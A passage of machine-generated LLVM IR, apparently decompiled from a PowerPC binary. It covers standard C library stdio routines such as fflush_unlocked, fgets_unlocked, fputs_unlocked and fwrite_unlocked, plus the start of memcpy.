  %v0_1000490c17 = phi i32 [ %v0_1000490c, %dec_label_pc_10004908.backedge ], [ %v0_1000490c12, %dec_label_pc_10004890 ]
  %v3_1000490c18.in = phi i32 [ %v0_1000490c, %dec_label_pc_10004908.backedge ], [ %v0_1000490c12, %dec_label_pc_10004890 ]
  %storemerge16 = phi i32 [ %storemerge, %dec_label_pc_10004908.backedge ], [ %storemerge8, %dec_label_pc_10004890 ]
  %v1_100048c0 = inttoptr i32 %storemerge16 to i16*
  %v2_100048c0 = load i16, i16* %v1_100048c0, align 2
  %v1_100048c4 = add i32 %storemerge16, 32
  %v2_100048c4 = inttoptr i32 %v1_100048c4 to i32*
  %v3_100048c4 = load i32, i32* %v2_100048c4, align 4
  store i32 %v3_100048c4, i32* @r31, align 4
  %v1_100048c8 = and i16 %v2_100048c0, -32720
  %v3_100048cc = icmp eq i16 %v1_100048c8, 48
  br i1 %v3_100048cc, label %dec_label_pc_100048dc, label %dec_label_pc_100048d4

dec_label_pc_100048d4:                            ; preds = %dec_label_pc_100048c0
  store i32 %storemerge16, i32* @r30, align 4
  br label %dec_label_pc_10004908.backedge

dec_label_pc_100048dc:                            ; preds = %dec_label_pc_100048c0
  %v3_1000490c18 = icmp eq i32 %v3_1000490c18.in, 0
  br i1 %v3_1000490c18, label %dec_label_pc_100048e0, label %dec_label_pc_100048ec

dec_label_pc_100048e0:                            ; preds = %dec_label_pc_100048dc
  store i32 %v3_100048c4, i32* bitcast (i32** @global_var_1001d7f4.350 to i32*), align 4
  br label %dec_label_pc_100048f0

dec_label_pc_100048ec:                            ; preds = %dec_label_pc_100048dc
  %v2_100048ec = add i32 %v0_1000490c17, 32
  %v3_100048ec = inttoptr i32 %v2_100048ec to i32*
  store i32 %v3_100048c4, i32* %v3_100048ec, align 4
  %v0_100048f0.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_100048f0

dec_label_pc_100048f0:                            ; preds = %dec_label_pc_100048e0, %dec_label_pc_100048ec
  %v0_100048f0 = phi i32 [ %storemerge16, %dec_label_pc_100048e0 ], [ %v0_100048f0.pre, %dec_label_pc_100048ec ]
  %v1_100048f0 = inttoptr i32 %v0_100048f0 to i16*
  %v2_100048f0 = load i16, i16* %v1_100048f0, align 2
  store i32 %v0_100048f0, i32* @r3, align 4
  %v1_100048f8 = and i16 %v2_100048f0, 8192
  %v3_100048f8 = icmp eq i16 %v1_100048f8, 0
  br i1 %v3_100048f8, label %dec_label_pc_10004908.backedge, label %dec_label_pc_10004900

dec_label_pc_10004908.backedge:                   ; preds = %dec_label_pc_100048f0, %dec_label_pc_100048d4, %dec_label_pc_10004900
  %storemerge = load i32, i32* @r31, align 4
  store i32 %storemerge, i32* @r29, align 4
  %v3_10004908 = icmp eq i32 %storemerge, 0
  %v0_1000490c = load i32, i32* @r30, align 4
  br i1 %v3_10004908, label %dec_label_pc_10004914, label %dec_label_pc_100048c0

dec_label_pc_10004900:                            ; preds = %dec_label_pc_100048f0
  store i32 268454148, i32* @lr, align 4
  %v0_10004900 = call i32 @free()
  br label %dec_label_pc_10004908.backedge

dec_label_pc_10004914:                            ; preds = %dec_label_pc_10004908.backedge, %dec_label_pc_10004890
  store i32 %v2_1000489c, i32* @r3, align 4
  %v0_1000491c = call i32 @__pthread_return_void()
  %v0_10004924 = load i32, i32* @r29, align 4
  store i32 %v0_10004924, i32* @global_var_1001d858.345, align 4
  %v3_10004930.pre = load i32, i32* @global_var_1001d854.344, align 4
  br label %dec_label_pc_10004928

dec_label_pc_10004928:                            ; preds = %entry, %dec_label_pc_10004880, %dec_label_pc_10004914
  %v3_10004930 = phi i32 [ %v3_10004874, %entry ], [ 1, %dec_label_pc_10004880 ], [ %v3_10004930.pre, %dec_label_pc_10004914 ]
  store i32 %v2_1000485c, i32* @r3, align 4
  %v1_10004938 = add i32 %v3_10004930, -1
  store i32 %v1_10004938, i32* @global_var_1001d854.344, align 4
  %v0_10004940 = call i32 @__pthread_return_void()
  ret i32 %v0_10004940

; uselistorder directives
  uselistorder i32 %v0_1000490c, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v0_100048f0, { 1, 0 }
  uselistorder i32 %v3_100048c4, { 1, 0, 2 }
  uselistorder i32 %storemerge16, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_10004928, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10004908.backedge, { 2, 0, 1 }
  uselistorder label %dec_label_pc_100048f0, { 1, 0 }
  uselistorder label %dec_label_pc_100048c0, { 1, 0 }
}

define i32 @fflush_unlocked(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* @r3, align 4
  %stack_var_-40 = alloca i32, align 4
  store i32 ptrtoint (i32** @global_var_1001d7f4.350 to i32), i32* %r9.global-to-local, align 4
  %v5_10004968 = icmp eq i16* %arg1, bitcast (i32** @global_var_1001d7f4.350 to i16*)
  store i32 %tmp, i32* @r29, align 4
  store i32 0, i32* @r27, align 4
  br i1 %v5_10004968, label %dec_label_pc_1000498c, label %dec_label_pc_10004980

dec_label_pc_10004980:                            ; preds = %entry
  %v4_10004980 = icmp eq i16* %arg1, null
  store i32 256, i32* @r27, align 4
  br i1 %v4_10004980, label %dec_label_pc_1000498c, label %dec_label_pc_10004ab8

dec_label_pc_1000498c:                            ; preds = %dec_label_pc_10004980, %entry
  store i32 268435456, i32* %r9.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10006d28.342 to i32), i32* @r30, align 4
  %v2_10004998 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_10004998, i32* @r3, align 4
  %v0_100049ac = call i32 @__pthread_return_void()
  %v0_100049b4 = call i32 @__pthread_return_0()
  %v3_100049bc = load i32, i32* @global_var_1001d854.344, align 4
  store i32 %v2_10004998, i32* @r3, align 4
  %v1_100049cc = add i32 %v3_100049bc, 1
  store i32 %v1_100049cc, i32* %r9.global-to-local, align 4
  store i32 %v1_100049cc, i32* @global_var_1001d854.344, align 4
  %v0_100049d8 = call i32 @__pthread_return_void()
  store i32 %v2_10004998, i32* @r3, align 4
  %v0_100049e8 = call i32 @__pthread_return_void()
  %v0_100049f0 = call i32 @__pthread_return_0()
  store i32 268566528, i32* %r9.global-to-local, align 4
  store i32 %v2_10004998, i32* @r3, align 4
  %v3_100049fc = load i32, i32* bitcast (i32** @global_var_1001d7f4.350 to i32*), align 4
  store i32 %v3_100049fc, i32* @r31, align 4
  store i32 0, i32* @r28, align 4
  %v0_10004a08 = call i32 @__pthread_return_void()
  %v0_10004aa8.pr = load i32, i32* @r31, align 4
  %v3_10004aa83 = icmp eq i32 %v0_10004aa8.pr, 0
  br i1 %v3_10004aa83, label %dec_label_pc_10004ab0, label %dec_label_pc_10004a10

dec_label_pc_10004a10:                            ; preds = %dec_label_pc_1000498c, %dec_label_pc_10004aa4
  %v0_10004a2c = phi i32 [ %v3_10004aa4, %dec_label_pc_10004aa4 ], [ %v0_10004aa8.pr, %dec_label_pc_1000498c ]
  %v1_10004a10 = inttoptr i32 %v0_10004a2c to i16*
  %v2_10004a10 = load i16, i16* %v1_10004a10, align 2
  %v3_10004a10 = zext i16 %v2_10004a10 to i32
  %v1_10004a14 = and i32 %v3_10004a10, 64
  store i32 %v1_10004a14, i32* %r9.global-to-local, align 4
  %v3_10004a14 = icmp eq i32 %v1_10004a14, 0
  br i1 %v3_10004a14, label %dec_label_pc_10004aa4, label %dec_label_pc_10004a1c

dec_label_pc_10004a1c:                            ; preds = %dec_label_pc_10004a10
  store i32 268566528, i32* %r9.global-to-local, align 4
  %v3_10004a20 = load i32, i32* @global_var_1001d7f8.348, align 4
  %v3_10004a24 = icmp eq i32 %v3_10004a20, 2
  br i1 %v3_10004a24, label %dec_label_pc_10004a48, label %dec_label_pc_10004a2c

dec_label_pc_10004a2c:                            ; preds = %dec_label_pc_10004a1c
  store i32 %v2_10004998, i32* @r3, align 4
  %v0_10004a3c = call i32 @__pthread_return_void()
  %v0_10004a44 = call i32 @__pthread_return_0()
  %v0_10004a48.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10004a48

dec_label_pc_10004a48:                            ; preds = %dec_label_pc_10004a1c, %dec_label_pc_10004a2c
  %v0_10004a5c = phi i32 [ %v0_10004a2c, %dec_label_pc_10004a1c ], [ %v0_10004a48.pre, %dec_label_pc_10004a2c ]
  %v1_10004a48 = inttoptr i32 %v0_10004a5c to i16*
  %v2_10004a48 = load i16, i16* %v1_10004a48, align 2
  %v3_10004a48 = zext i16 %v2_10004a48 to i32
  %v0_10004a4c = load i32, i32* @r27, align 4
  %v2_10004a4c = or i32 %v0_10004a4c, %v3_10004a48
  %v1_10004a50 = and i32 %v2_10004a4c, 832
  %v1_10004a54 = xor i32 %v1_10004a50, 320
  store i32 %v1_10004a54, i32* %r9.global-to-local, align 4
  %v3_10004a54 = icmp eq i32 %v1_10004a54, 0
  br i1 %v3_10004a54, label %dec_label_pc_10004a5c, label %dec_label_pc_10004a88

dec_label_pc_10004a5c:                            ; preds = %dec_label_pc_10004a48
  store i32 %v0_10004a5c, i32* @r3, align 4
  store i32 268454500, i32* @lr, align 4
  %v0_10004a60 = call i32 @__stdio_wcommit()
  %v3_10004a64 = icmp eq i32 %v0_10004a60, 0
  br i1 %v3_10004a64, label %dec_label_pc_10004a74, label %dec_label_pc_10004a6c

dec_label_pc_10004a6c:                            ; preds = %dec_label_pc_10004a5c
  store i32 -1, i32* @r28, align 4
  br label %dec_label_pc_10004a88

dec_label_pc_10004a74:                            ; preds = %dec_label_pc_10004a5c
  %v0_10004a74 = load i32, i32* @r31, align 4
  %v1_10004a74 = inttoptr i32 %v0_10004a74 to i16*
  %v2_10004a74 = load i16, i16* %v1_10004a74, align 2
  %v3_10004a74 = zext i16 %v2_10004a74 to i32
  %v1_10004a78 = add i32 %v0_10004a74, 8
  %v2_10004a78 = inttoptr i32 %v1_10004a78 to i32*
  %v3_10004a78 = load i32, i32* %v2_10004a78, align 4
  store i32 %v3_10004a78, i32* %r9.global-to-local, align 4
  %v1_10004a7c = call i32 @__asm_rlwinm(i32 %v3_10004a74, i32 0, i32 26, i32 24)
  %v2_10004a7c = trunc i32 %v1_10004a7c to i16
  %v1_10004a80 = load i32, i32* @r31, align 4
  %v2_10004a80 = add i32 %v1_10004a80, 28
  %v3_10004a80 = inttoptr i32 %v2_10004a80 to i32*
  store i32 %v3_10004a78, i32* %v3_10004a80, align 4
  %v3_10004a84 = load i32, i32* @r31, align 4
  %v4_10004a84 = inttoptr i32 %v3_10004a84 to i16*
  store i16 %v2_10004a7c, i16* %v4_10004a84, align 2
  br label %dec_label_pc_10004a88

dec_label_pc_10004a88:                            ; preds = %dec_label_pc_10004a48, %dec_label_pc_10004a6c, %dec_label_pc_10004a74
  store i32 268566528, i32* %r9.global-to-local, align 4
  %v3_10004a8c = load i32, i32* @global_var_1001d7f8.348, align 4
  %v3_10004a90 = icmp eq i32 %v3_10004a8c, 2
  br i1 %v3_10004a90, label %dec_label_pc_10004aa4, label %dec_label_pc_10004a98

dec_label_pc_10004a98:                            ; preds = %dec_label_pc_10004a88
  store i32 %v2_10004998, i32* @r3, align 4
  %v0_10004aa0 = call i32 @__pthread_return_void()
  br label %dec_label_pc_10004aa4

dec_label_pc_10004aa4:                            ; preds = %dec_label_pc_10004a88, %dec_label_pc_10004a10, %dec_label_pc_10004a98
  %v0_10004aa4 = load i32, i32* @r31, align 4
  %v1_10004aa4 = add i32 %v0_10004aa4, 32
  %v2_10004aa4 = inttoptr i32 %v1_10004aa4 to i32*
  %v3_10004aa4 = load i32, i32* %v2_10004aa4, align 4
  store i32 %v3_10004aa4, i32* @r31, align 4
  %v3_10004aa8 = icmp eq i32 %v3_10004aa4, 0
  br i1 %v3_10004aa8, label %dec_label_pc_10004ab0, label %dec_label_pc_10004a10

dec_label_pc_10004ab0:                            ; preds = %dec_label_pc_10004aa4, %dec_label_pc_1000498c
  store i32 ptrtoint (i32* @global_var_10004ab4.375 to i32), i32* @lr, align 4
  %v0_10004ab0 = call i32 @_stdio_openlist_dec_use()
  br label %dec_label_pc_10004af0

dec_label_pc_10004ab8:                            ; preds = %dec_label_pc_10004980
  %v3_10004ab8 = load i16, i16* %arg1, align 2
  %v4_10004ab8 = zext i16 %v3_10004ab8 to i32
  store i32 0, i32* @r28, align 4
  %v1_10004ac0 = and i32 %v4_10004ab8, 64
  store i32 %v1_10004ac0, i32* %r9.global-to-local, align 4
  %v3_10004ac0 = icmp eq i32 %v1_10004ac0, 0
  br i1 %v3_10004ac0, label %dec_label_pc_10004af0, label %dec_label_pc_10004ac8

dec_label_pc_10004ac8:                            ; preds = %dec_label_pc_10004ab8
  store i32 268454604, i32* @lr, align 4
  %v0_10004ac8 = call i32 @__stdio_wcommit()
  store i32 -1, i32* @r28, align 4
  %v3_10004ad0 = icmp eq i32 %v0_10004ac8, 0
  br i1 %v3_10004ad0, label %dec_label_pc_10004ad8, label %dec_label_pc_10004af0

dec_label_pc_10004ad8:                            ; preds = %dec_label_pc_10004ac8
  %v0_10004ad8 = load i32, i32* @r29, align 4
  %v1_10004ad8 = inttoptr i32 %v0_10004ad8 to i16*
  %v2_10004ad8 = load i16, i16* %v1_10004ad8, align 2
  %v3_10004ad8 = zext i16 %v2_10004ad8 to i32
  store i32 0, i32* @r28, align 4
  %v1_10004ae0 = add i32 %v0_10004ad8, 8
  %v2_10004ae0 = inttoptr i32 %v1_10004ae0 to i32*
  %v3_10004ae0 = load i32, i32* %v2_10004ae0, align 4
  store i32 %v3_10004ae0, i32* %r9.global-to-local, align 4
  %v1_10004ae4 = call i32 @__asm_rlwinm(i32 %v3_10004ad8, i32 0, i32 26, i32 24)
  %v2_10004ae4 = trunc i32 %v1_10004ae4 to i16
  %v3_10004ae8 = load i32, i32* @r29, align 4
  %v4_10004ae8 = inttoptr i32 %v3_10004ae8 to i16*
  store i16 %v2_10004ae4, i16* %v4_10004ae8, align 2
  %v0_10004aec = load i32, i32* %r9.global-to-local, align 4
  %v1_10004aec = load i32, i32* @r29, align 4
  %v2_10004aec = add i32 %v1_10004aec, 28
  %v3_10004aec = inttoptr i32 %v2_10004aec to i32*
  store i32 %v0_10004aec, i32* %v3_10004aec, align 4
  br label %dec_label_pc_10004af0

dec_label_pc_10004af0:                            ; preds = %dec_label_pc_10004ac8, %dec_label_pc_10004ab8, %dec_label_pc_10004ab0, %dec_label_pc_10004ad8
  %v0_10004af4 = load i32, i32* @r28, align 4
  ret i32 %v0_10004af4

; uselistorder directives
  uselistorder i32 %v3_10004aa4, { 1, 2, 0 }
  uselistorder i32 %v1_10004a54, { 1, 0 }
  uselistorder i32 %v2_10004998, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32* %r9.global-to-local, { 0, 1, 2, 3, 4, 5, 7, 6, 8, 9, 10, 11 }
  uselistorder i32 ()* @_stdio_openlist_dec_use, { 1, 0 }
  uselistorder i32* bitcast (i32** @global_var_1001d7f4.350 to i32*), { 3, 4, 0, 1, 2, 5, 6 }
  uselistorder i32* @global_var_1001d854.344, { 1, 2, 3, 0, 4, 5, 6 }
  uselistorder i16* %arg1, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_10004af0, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_10004aa4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10004a88, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10004a48, { 1, 0 }
  uselistorder label %dec_label_pc_10004a10, { 1, 0 }
}

define i32 @__GI_fgets_unlocked(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cr6_eq.global-to-local = alloca i1, align 1
  %cr7_eq.global-to-local = alloca i1, align 1
  %r11.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %arg2, i32* @r29, align 4
  store i32 %tmp, i32* @r28, align 4
  store i32 %arg3, i32* @r30, align 4
  %tmp19 = icmp slt i32 %arg2, 1
  br i1 %tmp19, label %dec_label_pc_10004bb0, label %dec_label_pc_10004b28

dec_label_pc_10004b28:                            ; preds = %entry
  store i32 %tmp, i32* @r31, align 4
  %v2_10004b903 = add i32 %arg2, -1
  store i32 %v2_10004b903, i32* @r29, align 4
  %v4_10004b989 = icmp eq i32 %arg2, 1
  br i1 %v4_10004b989, label %dec_label_pc_10004b9c, label %dec_label_pc_10004b30

dec_label_pc_10004b30:                            ; preds = %dec_label_pc_10004b28, %dec_label_pc_10004b90.backedge
  %v2_10004b4c = phi i32 [ %v2_10004b4c12, %dec_label_pc_10004b90.backedge ], [ %tmp, %dec_label_pc_10004b28 ]
  %v0_10004b30 = phi i32 [ %v0_10004b94, %dec_label_pc_10004b90.backedge ], [ %arg3, %dec_label_pc_10004b28 ]
  %v1_10004b30 = add i32 %v0_10004b30, 16
  %v2_10004b30 = inttoptr i32 %v1_10004b30 to i32*
  %v3_10004b30 = load i32, i32* %v2_10004b30, align 4
  %v1_10004b34 = add i32 %v0_10004b30, 24
  %v2_10004b34 = inttoptr i32 %v1_10004b34 to i32*
  %v3_10004b34 = load i32, i32* %v2_10004b34, align 4
  %v2_10004b38 = add i32 %v3_10004b30, 1
  store i32 %v2_10004b38, i32* %r11.global-to-local, align 4
  %v3_10004b3c = icmp ult i32 %v3_10004b30, %v3_10004b34
  %v5_10004b3c = icmp eq i32 %v3_10004b30, %v3_10004b34
  store i1 %v5_10004b3c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10004b3c, label %dec_label_pc_10004b44, label %dec_label_pc_10004b60

dec_label_pc_10004b44:                            ; preds = %dec_label_pc_10004b30
  %v4_10004b30 = inttoptr i32 %v3_10004b30 to i8*
  %v3_10004b44 = load i8, i8* %v4_10004b30, align 1
  %v3_10004b48 = icmp eq i8 %v3_10004b44, 10
  store i1 %v3_10004b48, i1* %cr7_eq.global-to-local, align 1
  %v3_10004b4c = inttoptr i32 %v2_10004b4c to i8*
  store i8 %v3_10004b44, i8* %v3_10004b4c, align 1
  %v0_10004b50 = load i32, i32* %r11.global-to-local, align 4
  %v1_10004b50 = load i32, i32* @r30, align 4
  %v2_10004b50 = add i32 %v1_10004b50, 16
  %v3_10004b50 = inttoptr i32 %v2_10004b50 to i32*
  store i32 %v0_10004b50, i32* %v3_10004b50, align 4
  %v0_10004b54 = load i32, i32* @r31, align 4
  %v1_10004b54 = add i32 %v0_10004b54, 1
  store i32 %v1_10004b54, i32* @r31, align 4
  %v0_10004b58 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_10004b58, label %dec_label_pc_10004b9c, label %dec_label_pc_10004b90.backedge

dec_label_pc_10004b60:                            ; preds = %dec_label_pc_10004b30
  %v1_10004b9410 = inttoptr i32 %v0_10004b30 to i16*
  store i32 268454756, i32* @lr, align 4
  %v5_10004b60 = call i32 @getc_unlocked(i16* %v1_10004b9410, i32 %v3_10004b30)
  %v6_10004b60 = trunc i32 %v5_10004b60 to i8
  %v4_10004b64 = icmp eq i8 %v6_10004b60, -1
  store i1 %v4_10004b64, i1* %cr7_eq.global-to-local, align 1
  %v3_10004b6c = icmp eq i8 %v6_10004b60, 10
  store i1 %v3_10004b6c, i1* %cr6_eq.global-to-local, align 1
  br i1 %v4_10004b64, label %dec_label_pc_10004b74, label %dec_label_pc_10004b84

dec_label_pc_10004b74:                            ; preds = %dec_label_pc_10004b60
  %v0_10004b74 = load i32, i32* @r30, align 4
  %v1_10004b74 = inttoptr i32 %v0_10004b74 to i16*
  %v2_10004b74 = load i16, i16* %v1_10004b74, align 2
  %v1_10004b78 = and i16 %v2_10004b74, 8
  %v3_10004b78 = icmp eq i16 %v1_10004b78, 0
  br i1 %v3_10004b78, label %dec_label_pc_10004b74.dec_label_pc_10004b9c_crit_edge, label %dec_label_pc_10004bb0

dec_label_pc_10004b74.dec_label_pc_10004b9c_crit_edge: ; preds = %dec_label_pc_10004b74
  %v0_10004b9c.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10004b9c

dec_label_pc_10004b84:                            ; preds = %dec_label_pc_10004b60
  %v3_10004b84 = load i32, i32* @r31, align 4
  %v4_10004b84 = inttoptr i32 %v3_10004b84 to i8*
  store i8 %v6_10004b60, i8* %v4_10004b84, align 1
  %v0_10004b88 = load i32, i32* @r31, align 4
  %v1_10004b88 = add i32 %v0_10004b88, 1
  store i32 %v1_10004b88, i32* @r31, align 4
  %v0_10004b8c = load i1, i1* %cr6_eq.global-to-local, align 1
  br i1 %v0_10004b8c, label %dec_label_pc_10004b9c, label %dec_label_pc_10004b90.backedge

dec_label_pc_10004b90.backedge:                   ; preds = %dec_label_pc_10004b84, %dec_label_pc_10004b44
  %v2_10004b4c12 = phi i32 [ %v1_10004b88, %dec_label_pc_10004b84 ], [ %v1_10004b54, %dec_label_pc_10004b44 ]
  %v0_10004b90 = load i32, i32* @r29, align 4
  %v2_10004b90 = add i32 %v0_10004b90, -1
  store i32 %v2_10004b90, i32* @r29, align 4
  %v0_10004b94 = load i32, i32* @r30, align 4
  %v4_10004b98 = icmp eq i32 %v0_10004b90, 1
  br i1 %v4_10004b98, label %dec_label_pc_10004b9c, label %dec_label_pc_10004b30

dec_label_pc_10004b9c:                            ; preds = %dec_label_pc_10004b84, %dec_label_pc_10004b90.backedge, %dec_label_pc_10004b44, %dec_label_pc_10004b28, %dec_label_pc_10004b74.dec_label_pc_10004b9c_crit_edge
  %v2_10004ba8 = phi i32 [ %v0_10004b9c.pre, %dec_label_pc_10004b74.dec_label_pc_10004b9c_crit_edge ], [ %tmp, %dec_label_pc_10004b28 ], [ %v1_10004b54, %dec_label_pc_10004b44 ], [ %v2_10004b4c12, %dec_label_pc_10004b90.backedge ], [ %v1_10004b88, %dec_label_pc_10004b84 ]
  %v1_10004b9c = load i32, i32* @r28, align 4
  %v3_10004b9c = icmp ugt i32 %v2_10004ba8, %v1_10004b9c
  %v4_10004b9c = icmp eq i32 %v2_10004ba8, %v1_10004b9c
  store i1 %v4_10004b9c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10004b9c, label %dec_label_pc_10004ba4, label %dec_label_pc_10004bb0

dec_label_pc_10004ba4:                            ; preds = %dec_label_pc_10004b9c
  %v3_10004ba8 = inttoptr i32 %v2_10004ba8 to i8*
  store i8 0, i8* %v3_10004ba8, align 1
  %v0_10004bb8.pre = load i32, i32* @r28, align 4
  br label %dec_label_pc_10004bb4

dec_label_pc_10004bb0:                            ; preds = %dec_label_pc_10004b74, %dec_label_pc_10004b9c, %entry
  store i32 0, i32* @r28, align 4
  br label %dec_label_pc_10004bb4

dec_label_pc_10004bb4:                            ; preds = %dec_label_pc_10004ba4, %dec_label_pc_10004bb0
  %v0_10004bb8 = phi i32 [ %v0_10004bb8.pre, %dec_label_pc_10004ba4 ], [ 0, %dec_label_pc_10004bb0 ]
  ret i32 %v0_10004bb8

; uselistorder directives
  uselistorder i32 %v2_10004ba8, { 0, 2, 1 }
  uselistorder i8 %v6_10004b60, { 1, 0, 2 }
  uselistorder i32 %v3_10004b34, { 1, 0 }
  uselistorder i32 %v3_10004b30, { 0, 4, 1, 2, 3 }
  uselistorder i32 %v0_10004b30, { 2, 1, 0 }
  uselistorder i32 %tmp, { 1, 0, 2, 3 }
  uselistorder i32 %arg2, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_10004bb4, { 1, 0 }
  uselistorder label %dec_label_pc_10004bb0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10004b9c, { 1, 0, 4, 2, 3 }
  uselistorder label %dec_label_pc_10004b30, { 1, 0 }
}

define i32 @__GI_fputs_unlocked(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r3, align 4
  %v0_10004be4 = call i32 @__GI_strlen()
  store i32 %v0_10004be4, i32* @r27, align 4
  store i32 ptrtoint (i32* @global_var_10004c00.376 to i32), i32* @lr, align 4
  %v4_10004bfc = inttoptr i32 %arg2 to i16*
  %v5_10004bfc = call i32 @__GI_fwrite_unlocked(i32 %arg1, i32 1, i32 %v0_10004be4, i16* %v4_10004bfc)
  %v1_10004c04 = load i32, i32* @r27, align 4
  %v4_10004c04 = icmp eq i32 %v5_10004bfc, %v1_10004c04
  br i1 %v4_10004c04, label %dec_label_pc_10004c0c, label %dec_label_pc_10004c10

dec_label_pc_10004c0c:                            ; preds = %entry
  br label %dec_label_pc_10004c10

dec_label_pc_10004c10:                            ; preds = %entry, %dec_label_pc_10004c0c
  %v0_10004c10 = phi i32 [ -1, %entry ], [ %v5_10004bfc, %dec_label_pc_10004c0c ]
  ret i32 %v0_10004c10

; uselistorder directives
  uselistorder label %dec_label_pc_10004c10, { 1, 0 }
}

define i32 @__GI_fwrite_unlocked(i32 %arg1, i32 %arg2, i32 %arg3, i16* %arg4) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg4 to i32
  store i32 %arg2, i32* %r4.global-to-local, align 4
  store i32 %arg2, i32* @r29, align 4
  store i32 %arg1, i32* @r28, align 4
  %v3_10004c40 = load i16, i16* %arg4, align 2
  %v4_10004c40 = zext i16 %v3_10004c40 to i32
  store i32 %tmp, i32* @r31, align 4
  store i32 128, i32* @r4, align 4
  store i32 %arg3, i32* @r30, align 4
  %v1_10004c50 = call i32 @__asm_rlwinm(i32 %v4_10004c40, i32 0, i32 24, i32 25)
  %v3_10004c58 = icmp eq i32 %v1_10004c50, 192
  br i1 %v3_10004c58, label %dec_label_pc_10004c6c, label %dec_label_pc_10004c60

dec_label_pc_10004c60:                            ; preds = %entry
  store i32 268455012, i32* @lr, align 4
  %v3_10004c60 = call i32 @__stdio_trans2w_o(i16* nonnull %arg4)
  %v3_10004c64 = icmp eq i32 %v3_10004c60, 0
  br i1 %v3_10004c64, label %dec_label_pc_10004c6c, label %dec_label_pc_10004cc4

dec_label_pc_10004c6c:                            ; preds = %dec_label_pc_10004c60, %entry
  %v0_10004c6c = load i32, i32* @r29, align 4
  %v3_10004c6c = icmp eq i32 %v0_10004c6c, 0
  %v0_10004c70 = load i32, i32* @r30, align 4
  %v3_10004c70 = icmp eq i32 %v0_10004c70, 0
  %brmerge = or i1 %v3_10004c6c, %v3_10004c70
  br i1 %brmerge, label %dec_label_pc_10004cc4, label %dec_label_pc_10004c7c

dec_label_pc_10004c7c:                            ; preds = %dec_label_pc_10004c6c
  %v2_10004c84 = udiv i32 -1, %v0_10004c6c
  %v0_10004c88 = load i32, i32* @r31, align 4
  %v3_10004c8c = icmp ugt i32 %v0_10004c70, %v2_10004c84
  %v1_10004ca4 = inttoptr i32 %v0_10004c88 to i16*
  br i1 %v3_10004c8c, label %dec_label_pc_10004ca4, label %dec_label_pc_10004c94

dec_label_pc_10004c94:                            ; preds = %dec_label_pc_10004c7c
  %v0_10004c80 = load i32, i32* @r28, align 4
  %v2_10004c94 = mul i32 %v0_10004c70, %v0_10004c6c
  store i32 %v2_10004c94, i32* %r4.global-to-local, align 4
  store i32 268455068, i32* @lr, align 4
  %v5_10004c98 = call i32 @__stdio_fwrite(i32 %v0_10004c80, i32 %v2_10004c94, i16* %v1_10004ca4)
  %v1_10004c9c = load i32, i32* @r29, align 4
  %v2_10004c9c = udiv i32 %v5_10004c98, %v1_10004c9c
  store i32 %v2_10004c9c, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10004cc8

dec_label_pc_10004ca4:                            ; preds = %dec_label_pc_10004c7c
  %v2_10004ca4 = load i16, i16* %v1_10004ca4, align 2
  %v1_10004ca8 = or i16 %v2_10004ca4, 8
  store i16 %v1_10004ca8, i16* %v1_10004ca4, align 2
  %v0_10004cb0 = call i32 @__errno_location()
  store i32 0, i32* %r4.global-to-local, align 4
  %v2_10004cbc = inttoptr i32 %v0_10004cb0 to i32*
  store i32 22, i32* %v2_10004cbc, align 4
  %v0_10004ccc.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10004cc8

dec_label_pc_10004cc4:                            ; preds = %dec_label_pc_10004c6c, %dec_label_pc_10004c60
  store i32 0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10004cc8

dec_label_pc_10004cc8:                            ; preds = %dec_label_pc_10004ca4, %dec_label_pc_10004c94, %dec_label_pc_10004cc4
  %v0_10004ccc = phi i32 [ %v0_10004ccc.pre, %dec_label_pc_10004ca4 ], [ %v2_10004c9c, %dec_label_pc_10004c94 ], [ 0, %dec_label_pc_10004cc4 ]
  ret i32 %v0_10004ccc

; uselistorder directives
  uselistorder i16* %v1_10004ca4, { 1, 2, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32 (i32, i32, i16*)* @__stdio_fwrite, { 1, 2, 3, 5, 6, 0, 4 }
  uselistorder label %dec_label_pc_10004cc8, { 2, 0, 1 }
}

define i32 @memcpy() local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %v0_10004ce0 = load i32, i32* @r5, align 4
  %v1_10004ce0 = call i32 @__asm_rlwinm.(i32 %v0_10004ce0, i32 29, i32 3, i32 31)
  store i32 %v1_10004ce0, i32* %r9.global-to-local, align 4
  %v4_10004ce0 = icmp eq i32 %v1_10004ce0, 0
  store i1 false, i1* @cr0_so, align 1
  %v0_10004ce4 = load i32, i32* @r4, align 4
  %v1_10004ce4 = add i32 %v0_10004ce4, -4
  store i32 %v1_10004ce4, i32* %r4.global-to-local, align 4
  %v0_10004ce8 = load i32, i32* @r3, align 4
  %v1_10004ce8 = add i32 %v0_10004ce8, -4
